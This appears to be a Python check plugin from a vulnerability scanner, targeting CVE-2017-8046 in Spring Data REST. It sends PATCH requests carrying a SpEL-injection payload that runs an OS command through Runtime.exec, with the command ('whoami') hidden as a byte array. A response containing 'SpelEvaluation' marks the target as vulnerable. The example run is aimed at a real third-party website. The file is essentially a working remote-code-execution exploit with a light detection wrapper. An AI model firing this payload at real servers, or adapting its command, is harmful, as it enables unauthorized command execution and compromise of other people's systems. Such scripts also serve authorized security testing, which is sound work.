#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'


def info(data=None):
    info = {
        "name": "spring_cve_2017_8046",
        "info": "spring_cve_2017_8046.",
        "level": "high",
        "type": "rce"
    }
    return info

def prove(data):
    data = init(data,'spring')
    if data['url']:
        try:
            headers = {
                "Content-Type": "application/json-patch+json",
            }
            datas = ['[{"op":"add","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119, 104, 111, 97, 109, 105}))/foo"}]',
                '[{"op":"add","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119, 104, 111, 97, 109, 105}))[foo]"}]']
            for _data in datas:
                res = curl('patch',data['url'], data = _data, headers = headers)
                if "SpelEvaluation" in res.text :
                    data['flag'] = 1
                    data['data'].append({"name": 'spring_cve_2017_8046'})
                    data['res'].append({"info": data['url'], "key": "id"})
                    break
        except:
            pass
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))